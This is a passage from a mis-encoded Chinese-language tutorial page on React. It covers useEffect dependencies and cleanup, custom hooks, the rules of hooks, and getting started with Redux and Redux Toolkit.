title="12.3 useEffect ä¾èµ–é¡¹å‚æ•°è¯´æ˜"></a>12.3 useEffect ä¾èµ–é¡¹å‚æ•°è¯´æ˜</h2><p>useEffectå‰¯ä½œç”¨å‡½æ•°çš„æ‰§è¡Œæ—¶æœºå­˜åœ¨å¤šç§æƒ…å†µï¼Œæ ¹æ®ä¼ å…¥ä¾èµ–é¡¹çš„ä¸åŒï¼Œä¼šæœ‰ä¸åŒçš„æ‰§è¡Œè¡¨ç°:</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-02%2016.35.58.png" style="zoom:40%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useEffect<span class="token punctuation">,</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// 1. æ²¡æœ‰ä¾èµ–é¡¹  åˆå§‹ + ç»„ä»¶æ›´æ–°(ä¾‹å¦‚çŠ¶æ€å˜é‡æ›´æ–°)</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment">// useEffect(() =&gt; {</span>  <span class="token comment">//   console.log('å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œäº†')</span>  <span class="token comment">// })</span>  <span class="token comment">// 2. ä¼ å…¥ç©ºæ•°ç»„ä¾èµ–  åˆå§‹æ‰§è¡Œä¸€æ¬¡</span>  <span class="token comment">// useEffect(() =&gt; {</span>  <span class="token comment">//   console.log('å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œäº†')</span>  <span class="token comment">// }, [])</span>  <span class="token comment">// 3. ä¼ å…¥ç‰¹å®šä¾èµ–é¡¹  åˆå§‹ + ä¾èµ–é¡¹å˜åŒ–æ—¶æ‰§è¡Œ</span>  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œäº†'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is app      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">+</span><span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="12-4-æ¸…é™¤å‰¯ä½œç”¨"><a href="#12-4-æ¸…é™¤å‰¯ä½œç”¨" class="headerlink" title="12.4 æ¸…é™¤å‰¯ä½œç”¨"></a>12.4 æ¸…é™¤å‰¯ä½œç”¨</h2><p>åœ¨useEffectä¸­ç¼–å†™çš„ç”±æ¸²æŸ“æœ¬èº«å¼•èµ·çš„å¯¹æ¥ç»„ä»¶å¤–éƒ¨çš„æ“ä½œï¼Œç¤¾åŒºä¹Ÿç»å¸¸æŠŠå®ƒå«åšå‰¯ä½œç”¨æ“ä½œï¼Œæ¯”å¦‚åœ¨useEffectä¸­å¼€å¯äº†ä¸€ä¸ªå®šæ—¶å™¨ï¼Œæˆ‘ä»¬æƒ³åœ¨ç»„ä»¶å¸è½½æ—¶æŠŠè¿™ä¸ªå®šæ—¶å™¨å†æ¸…ç†æ‰ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯æ¸…ç†å‰¯ä½œç”¨ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-02%2016.45.35.png" style="zoom:50%;"><ul><li><p>è¯´æ˜ï¼šæ¸…é™¤å‰¯ä½œç”¨çš„å‡½æ•°æœ€å¸¸è§çš„æ‰§è¡Œæ—¶æœºæ˜¯åœ¨ç»„ä»¶å¸è½½æ—¶è‡ªåŠ¨æ‰§è¡Œã€‚ </p></li><li><p>éœ€æ±‚ï¼šåœ¨Sonç»„ä»¶æ¸²æŸ“æ—¶å¼€å¯ä¸€ä¸ªå®šåˆ¶å™¨ï¼Œå¸è½½æ—¶æ¸…é™¤è¿™ä¸ªå®šæ—¶å™¨ã€‚</p></li></ul><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useEffect<span class="token punctuation">,</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token keyword">function</span> <span class="token function">Son</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// 1. æ¸²æŸ“æ—¶å¼€å¯ä¸€ä¸ªå®šæ—¶å™¨</span>  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> timer <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'å®šæ—¶å™¨æ‰§è¡Œä¸­...'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>      <span class="token comment">// æ¸…é™¤å‰¯ä½œç”¨(ç»„ä»¶å¸è½½æ—¶)</span>      <span class="token function">clearInterval</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is son</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// é€šè¿‡æ¡ä»¶æ¸²æŸ“æ¨¡æ‹Ÿç»„ä»¶å¸è½½</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>show<span class="token punctuation">,</span> setShow<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span>show <span class="token operator">&amp;&amp;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Son</span></span> <span class="token punctuation">/&gt;</span></span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setShow</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">å¸è½½Sonç»„ä»¶</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="åä¸‰ã€è‡ªå®šä¹‰Hookå‡½æ•°"><a href="#åä¸‰ã€è‡ªå®šä¹‰Hookå‡½æ•°" class="headerlink" title="åä¸‰ã€è‡ªå®šä¹‰Hookå‡½æ•°"></a>åä¸‰ã€è‡ªå®šä¹‰Hookå‡½æ•°</h1><h2 id="13-1-è‡ªå®šä¹‰Hookå‡½æ•°åŸºç¡€ç”¨æ³•"><a href="#13-1-è‡ªå®šä¹‰Hookå‡½æ•°åŸºç¡€ç”¨æ³•" class="headerlink" title="13.1 è‡ªå®šä¹‰Hookå‡½æ•°åŸºç¡€ç”¨æ³•"></a>13.1 è‡ªå®šä¹‰Hookå‡½æ•°åŸºç¡€ç”¨æ³•</h2><p>æ¦‚å¿µï¼šè‡ªå®šä¹‰Hookæ˜¯ä»¥ use æ‰“å¤´çš„å‡½æ•°ï¼Œé€šè¿‡è‡ªå®šä¹‰Hookå‡½æ•°å¯ä»¥ç”¨æ¥å®ç°é€»è¾‘çš„å°è£…å’Œå¤ç”¨ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-02%2017.10.41.png" style="zoom:40%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// å°è£…è‡ªå®šä¹‰Hook</span><span class="token comment">// é—®é¢˜: å¸ƒå°”åˆ‡æ¢çš„é€»è¾‘ å½“å‰ç»„ä»¶è€¦åˆåœ¨ä¸€èµ·çš„ ä¸æ–¹ä¾¿å¤ç”¨</span><span class="token comment">// è§£å†³æ€è·¯: è‡ªå®šä¹‰hook</span><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token keyword">function</span> <span class="token function">useToggle</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// å¯å¤ç”¨çš„é€»è¾‘ä»£ç </span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>value<span class="token punctuation">,</span> setValue<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">toggle</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token operator">!</span>value<span class="token punctuation">)</span>  <span class="token comment">// å“ªäº›çŠ¶æ€å’Œå›è°ƒå‡½æ•°éœ€è¦åœ¨å…¶ä»–ç»„ä»¶ä¸­ä½¿ç”¨ return</span>  <span class="token keyword">return</span> <span class="token punctuation">{</span>    value<span class="token punctuation">,</span>    toggle  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// å°è£…è‡ªå®šä¹‰hooké€šç”¨æ€è·¯</span><span class="token comment">// 1. å£°æ˜ä¸€ä¸ªä»¥useæ‰“å¤´çš„å‡½æ•°</span><span class="token comment">// 2. åœ¨å‡½æ•°ä½“å†…å°è£…å¯å¤ç”¨çš„é€»è¾‘ï¼ˆåªè¦æ˜¯å¯å¤ç”¨çš„é€»è¾‘ï¼‰</span><span class="token comment">// 3. æŠŠç»„ä»¶ä¸­ç”¨åˆ°çš„çŠ¶æ€æˆ–è€…å›è°ƒreturnå‡ºå»ï¼ˆä»¥å¯¹è±¡æˆ–è€…æ•°ç»„ï¼‰</span><span class="token comment">// 4. åœ¨å“ªä¸ªç»„ä»¶ä¸­è¦ç”¨åˆ°è¿™ä¸ªé€»è¾‘ï¼Œå°±æ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œè§£æ„å‡ºæ¥çŠ¶æ€å’Œå›è°ƒè¿›è¡Œä½¿ç”¨</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token punctuation">{</span> value<span class="token punctuation">,</span> toggle <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">useToggle</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span>value <span class="token operator">&amp;&amp;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is div</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>toggle<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">toggle</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="13-2-ReactHooksä½¿ç”¨è§„åˆ™"><a href="#13-2-ReactHooksä½¿ç”¨è§„åˆ™" class="headerlink" title="13.2 ReactHooksä½¿ç”¨è§„åˆ™"></a>13.2 ReactHooksä½¿ç”¨è§„åˆ™</h2><p>ä½¿ç”¨è§„åˆ™</p><ol><li>åªèƒ½åœ¨ç»„ä»¶ä¸­æˆ–è€…å…¶ä»–è‡ªå®šä¹‰Hookå‡½æ•°ä¸­è°ƒç”¨ã€‚</li><li>åªèƒ½åœ¨ç»„ä»¶çš„é¡¶å±‚è°ƒç”¨ï¼Œä¸èƒ½åµŒå¥—åœ¨ ifã€forã€å…¶ä»–å‡½æ•°ä¸­ã€‚</li></ol><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-02%2017.22.18.png" style="zoom:67%;"><h1 id="åå››ã€Redux-React"><a href="#åå››ã€Redux-React" class="headerlink" title="åå››ã€Redux+React"></a>åå››ã€Redux+React</h1><h2 id="14-1-Reduxå¿«é€Ÿä¸Šæ‰‹"><a href="#14-1-Reduxå¿«é€Ÿä¸Šæ‰‹" class="headerlink" title="14.1 Reduxå¿«é€Ÿä¸Šæ‰‹"></a>14.1 Reduxå¿«é€Ÿä¸Šæ‰‹</h2><h3 id="14-1-1-ä»€ä¹ˆæ˜¯Reduxï¼Ÿ"><a href="#14-1-1-ä»€ä¹ˆæ˜¯Reduxï¼Ÿ" class="headerlink" title="14.1.1 ä»€ä¹ˆæ˜¯Reduxï¼Ÿ"></a>14.1.1 ä»€ä¹ˆæ˜¯Reduxï¼Ÿ</h3><p>Redux æ˜¯Reactæœ€å¸¸ç”¨çš„é›†ä¸­çŠ¶æ€ç®¡ç†å·¥å…·ï¼Œç±»ä¼¼äºVueä¸­çš„Piniaï¼ˆVuexï¼‰ï¼Œå¯ä»¥ç‹¬ç«‹äºæ¡†æ¶è¿è¡Œã€‚</p><p>ä½œç”¨ï¼šé€šè¿‡é›†ä¸­ç®¡ç†çš„æ–¹å¼ç®¡ç†åº”ç”¨çš„çŠ¶æ€ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2017.04.23.png" style="zoom:50%;"><h3 id="14-1-2-Reduxå¿«é€Ÿä½“éªŒ"><a href="#14-1-2-Reduxå¿«é€Ÿä½“éªŒ" class="headerlink" title="14.1.2 Reduxå¿«é€Ÿä½“éªŒ"></a>14.1.2 Reduxå¿«é€Ÿä½“éªŒ</h3><p>ä¸å’Œä»»ä½•æ¡†æ¶ç»‘å®šï¼Œä¸ä½¿ç”¨ä»»ä½•æ„å»ºå·¥å…·ï¼Œä½¿ç”¨çº¯Reduxå®ç°è®¡æ•°å™¨ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2017.05.47.png" style="zoom:50%;"><p>ä½¿ç”¨æ­¥éª¤ï¼š</p><ol><li>å®šä¹‰ä¸€ä¸ª reducer å‡½æ•° ï¼ˆæ ¹æ®å½“å‰æƒ³è¦åšçš„ä¿®æ”¹è¿”å›ä¸€ä¸ªæ–°çš„çŠ¶æ€ï¼‰ã€‚</li><li>ä½¿ç”¨createStoreæ–¹æ³•ä¼ å…¥ reducerå‡½æ•° ç”Ÿæˆä¸€ä¸ªstoreå®ä¾‹å¯¹è±¡ã€‚</li><li>ä½¿ç”¨storeå®ä¾‹çš„ subscribeæ–¹æ³• è®¢é˜…æ•°æ®çš„å˜åŒ–ï¼ˆæ•°æ®ä¸€æ—¦å˜åŒ–ï¼Œå¯ä»¥å¾—åˆ°é€šçŸ¥ï¼‰ã€‚</li><li>ä½¿ç”¨storeå®ä¾‹çš„ dispatchæ–¹æ³•æäº¤actionå¯¹è±¡è§¦å‘æ•°æ®å˜åŒ–ï¼ˆå‘Šè¯‰reducerä½ æƒ³æ€ä¹ˆæ”¹æ•°æ®ï¼‰ã€‚</li><li>ä½¿ç”¨storeå®ä¾‹çš„ getStateæ–¹æ³• è·å–æœ€æ–°çš„çŠ¶æ€æ•°æ®æ›´æ–°åˆ°è§†å›¾ä¸­ã€‚</li></ol><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>decrement<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">-</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>count<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">0</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>increment<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">+</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://unpkg.com/redux@latest/dist/redux.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">  // 1. å®šä¹‰reducerå‡½æ•°   // ä½œç”¨: æ ¹æ®ä¸åŒçš„actionå¯¹è±¡ï¼Œè¿”å›ä¸åŒçš„æ–°çš„state  // state: ç®¡ç†çš„æ•°æ®åˆå§‹çŠ¶æ€  // action: å¯¹è±¡ type æ ‡è®°å½“å‰æƒ³è¦åšä»€ä¹ˆæ ·çš„ä¿®æ”¹  function reducer (state = { count: 0 }, action) {    // æ•°æ®ä¸å¯å˜ï¼šåŸºäºåŸå§‹çŠ¶æ€ç”Ÿæˆä¸€ä¸ªæ–°çš„çŠ¶æ€    if (action.type === 'INCREMENT') {      return { count: state.count + 1 }    }    if (action.type === 'DECREMENT') {      return { count: state.count - 1 }    }    return state  }  // 2. ä½¿ç”¨reducerå‡½æ•°ç”Ÿæˆstoreå®ä¾‹  const store = Redux.createStore(reducer)  // 3. é€šè¿‡storeå®ä¾‹çš„subscribeè®¢é˜…æ•°æ®å˜åŒ–  // å›è°ƒå‡½æ•°å¯ä»¥åœ¨æ¯æ¬¡stateå‘ç”Ÿå˜åŒ–çš„æ—¶å€™è‡ªåŠ¨æ‰§è¡Œ  store.subscribe(() =&gt; {    console.log('stateå˜åŒ–äº†', store.getState())    document.getElementById('count').innerText = store.getState().count  })  // 4. é€šè¿‡storeå®ä¾‹çš„dispatchå‡½æ•°æäº¤actionæ›´æ”¹çŠ¶æ€   const inBtn = document.getElementById('increment')  inBtn.addEventListener('click', () =&gt; {    // å¢    store.dispatch({      type: 'INCREMENT'    })  })  const dBtn = document.getElementById('decrement')  dBtn.addEventListener('click', () =&gt; {    // å‡    store.dispatch({      type: 'DECREMENT'    })  })  // 5. é€šè¿‡storeå®ä¾‹çš„getStateæ–¹æ³•è·å–æœ€æ–°çŠ¶æ€æ›´æ–°åˆ°è§†å›¾ä¸­</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="14-1-3-Reduxç®¡ç†æ•°æ®æµç¨‹æ¢³ç†"><a href="#14-1-3-Reduxç®¡ç†æ•°æ®æµç¨‹æ¢³ç†" class="headerlink" title="14.1.3 Reduxç®¡ç†æ•°æ®æµç¨‹æ¢³ç†"></a>14.1.3 Reduxç®¡ç†æ•°æ®æµç¨‹æ¢³ç†</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2017.26.50.png" style="zoom:50%;"><p>ä¸ºäº†èŒè´£æ¸…æ™°ï¼Œæ•°æ®æµå‘æ˜ç¡®ï¼ŒReduxæŠŠæ•´ä¸ªæ•°æ®ä¿®æ”¹çš„æµç¨‹åˆ†æˆäº†ä¸‰ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼Œåˆ†åˆ«æ˜¯ï¼šstateã€actionå’Œreducer</p><ol><li>state - ä¸€ä¸ªå¯¹è±¡ å­˜æ”¾ç€æˆ‘ä»¬ç®¡ç†çš„æ•°æ®çŠ¶æ€ã€‚</li><li>action - ä¸€ä¸ªå¯¹è±¡ ç”¨æ¥æè¿°ä½ æƒ³æ€ä¹ˆæ”¹æ•°æ®ã€‚</li><li>reducer - ä¸€ä¸ªå‡½æ•° æ ¹æ®actionçš„æè¿°ç”Ÿæˆä¸€ä¸ªæ–°çš„stateã€‚</li></ol><h2 id="14-2-Reduxä¸React"><a href="#14-2-Reduxä¸React" class="headerlink" title="14.2 Reduxä¸React"></a>14.2 Reduxä¸React</h2><h3 id="14-2-1-ç¯å¢ƒå‡†å¤‡"><a href="#14-2-1-ç¯å¢ƒå‡†å¤‡" class="headerlink" title="14.2.1 ç¯å¢ƒå‡†å¤‡"></a>14.2.1 ç¯å¢ƒå‡†å¤‡</h3><h4 id="1ï¼‰é…å¥—å·¥å…·"><a href="#1ï¼‰é…å¥—å·¥å…·" class="headerlink" title="1ï¼‰é…å¥—å·¥å…·"></a>1ï¼‰é…å¥—å·¥å…·</h4><p>åœ¨Reactä¸­ä½¿ç”¨reduxï¼Œå®˜æ–¹è¦æ±‚å®‰è£…ä¿©ä¸ªå…¶ä»–æ’ä»¶ - Redux Toolkit å’Œ react-redux</p><ol><li>Redux Toolkitï¼ˆRTKï¼‰- å®˜æ–¹æ¨èç¼–å†™Reduxé€»è¾‘çš„æ–¹å¼ï¼Œæ˜¯ä¸€å¥—å·¥å…·çš„é›†åˆé›†ï¼Œç®€åŒ–ä¹¦å†™æ–¹å¼ã€‚</li></ol><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2017.33.28.png" style="zoom:50%;"><ol start="2"><li>react-redux - ç”¨æ¥ é“¾æ¥ Redux å’Œ Reactç»„ä»¶ çš„ä¸­é—´ä»¶ã€‚</li></ol><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2017.33.48.png" style="zoom:50%;"><h4 id="2ï¼‰é…ç½®åŸºç¡€ç¯å¢ƒ"><a href="#2ï¼‰é…ç½®åŸºç¡€ç¯å¢ƒ" class="headerlink" title="2ï¼‰é…ç½®åŸºç¡€ç¯å¢ƒ"></a>2ï¼‰é…ç½®åŸºç¡€ç¯å¢ƒ</h4><ul><li>ä½¿ç”¨ CRA å¿«é€Ÿåˆ›å»º React é¡¹ç›®</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx create-react-app react-redux-pro<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h3 id="å¤§æˆ˜bug-ã€Œnpx-create-react-app-é¡¹ç›®ææ…¢ã€"><a href="#å¤§æˆ˜bug-ã€Œnpx-create-react-app-é¡¹ç›®ææ…¢ã€" class="headerlink" title="å¤§æˆ˜bug-ã€Œnpx create-react-app é¡¹ç›®ææ…¢ã€"></a>å¤§æˆ˜bug-ã€Œnpx create-react-app é¡¹ç›®ææ…¢ã€</h3><p>æ›´æ–°æºï¼šnpm config set registry <a href="https://registry.npmmirror.com/">https://registry.npmmirror.com</a></p><p># æŸ¥çœ‹ä¿®æ”¹çš„ç»“æœ</p><p> npm config get registry</p></blockquote><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2018.02.58.png" style="zoom:40%;"><ul><li>cdåˆ°é¡¹ç›®ç›®å½•ä¸­ï¼Œå®‰è£…ä¾èµ–ï¼š</li></ul><p>å®‰è£…é…å¥—å·¥å…·</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i @reduxjs/toolkit  react-redux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2018.05.01.png" style="zoom:50%;"><ul><li>å¯åŠ¨é¡¹ç›®</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> run start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h3 id="å¤§æˆ˜bug-ã€Œnpm-run-start-å¯åŠ¨å¤±è´¥ã€"><a href="#å¤§æˆ˜bug-ã€Œnpm-run-start-å¯åŠ¨å¤±è´¥ã€" class="headerlink" title="å¤§æˆ˜bug-ã€Œnpm run start å¯åŠ¨å¤±è´¥ã€"></a>å¤§æˆ˜bug-ã€Œnpm run start å¯åŠ¨å¤±è´¥ã€</h3><img 